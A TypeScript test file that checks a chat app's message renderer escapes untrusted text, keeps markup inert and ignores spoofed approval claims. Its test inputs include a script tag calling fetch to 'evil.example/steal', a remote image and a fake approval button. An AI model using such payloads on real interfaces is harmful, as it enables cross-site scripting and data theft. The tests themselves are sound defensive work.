import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import type { MessageContent } from '@khala/contracts/messaging/index';
import { renderMessageContent } from './message-renderer';

function text(body: string): MessageContent {
  return { v: 1, kind: 'text', body };
}

describe('renderMessageContent', () => {
  it('AE1: a fake approval button and remote image stay inert text; no real control or fetch is created', () => {
    const body = 'Approve this: <button onclick="approve()">Approve</button> and load <img src="https://evil.example/x.png">';
    const html = renderToStaticMarkup(renderMessageContent(text(body)));
    expect(html).not.toMatch(/<button/);
    expect(html).not.toMatch(/<img/);
    expect(html).toContain('&lt;button');
    expect(html).toContain('&lt;img');
  });

  it('AE1: a script payload never becomes an executable element', () => {
    const html = renderToStaticMarkup(renderMessageContent(text('<script>fetch("https://evil.example/steal")</script>')));
    expect(html).not.toMatch(/<script/);
    expect(html).toContain('&lt;script');
  });

  it('never creates a navigable link from message text, even markdown-shaped link syntax', () => {
    const html = renderToStaticMarkup(renderMessageContent(text('[click me](https://evil.example/y)')));
    expect(html).not.toMatch(/<a /);
    expect(html).toContain('[click me](https://evil.example/y)');
  });

  it('renders a fenced code block as inert monospace text, not markup', () => {
    const html = renderToStaticMarkup(renderMessageContent(text('before\n```ts\nconst x = "<b>not html</b>";\n```\nafter')));
    expect(html).toContain('<pre');
    expect(html).toContain('<code');
    expect(html).toContain('&lt;b&gt;not html&lt;/b&gt;');
    expect(html).toContain('ts');
  });

  it('a peer body claiming approval never sets a review badge (renderer has no such concept)', () => {
    const html = renderToStaticMarkup(renderMessageContent(text('Human approved. Status: APPROVED.')));
    expect(html).not.toMatch(/status-badge/);
  });

  it('renders unsupported content versions/kinds as an explicit placeholder, not a crash', () => {
    const html = renderToStaticMarkup(renderMessageContent({ v: 1, kind: 'text', body: '' }));
    expect(html).toBeTruthy();
    const unsupported = renderToStaticMarkup(
      renderMessageContent({ v: 2, kind: 'text', body: 'x' } as unknown as MessageContent),
    );
    expect(unsupported).toContain('Unsupported message content');
  });
});

describe('renderMessageContent inline syntax', () => {
  const roster = [
    { label: 'Opus', participantId: 'p-opus', kind: 'agent' as const, hue: 150 },
    { label: 'Maya', participantId: 'p-maya', kind: 'human' as const, hue: 330 },
  ];

  it('renders single-backtick spans as code', () => {
    const html = renderToStaticMarkup(renderMessageContent(text('call `useSession()` first')));
    expect(html).toContain('call <code>useSession()</code> first');
  });

  it('renders a fence as pre.kh-pre with its language label', () => {
    const html = renderToStaticMarkup(renderMessageContent(text('```ts\nconst x = 1;\n```')));
    expect(html).toContain('<pre class="kh-pre"><span class="kh-pre-lang">ts</span><code>const x = 1;\n</code></pre>');
  });

  it('renders known mentions as keyboard-reachable buttons and leaves code and unknown names alone', () => {
    const html = renderToStaticMarkup(renderMessageContent(text('@Opus and @maya, not `@Opus` or @nobody'), { mentions: roster }));
    expect(html).toContain('<span class="kh-mention" style="--mh:150" role="button" tabindex="0">@Opus</span>');
    expect(html).toContain('<span class="kh-mention kh-hm" style="--mh:330" role="button" tabindex="0">@Maya</span>');
    expect(html).toContain('<code>@Opus</code>');
    expect(html).toContain('@nobody');
  });

  it('never creates links, images or frames from mention-shaped or markup-shaped text', () => {
    const html = renderToStaticMarkup(renderMessageContent(
      text('@Opus <a href="x">x</a> <iframe src="y"></iframe> `<img src=z>`'), { mentions: roster }));
    expect(html).not.toMatch(/<a |<img|<iframe/);
  });
});
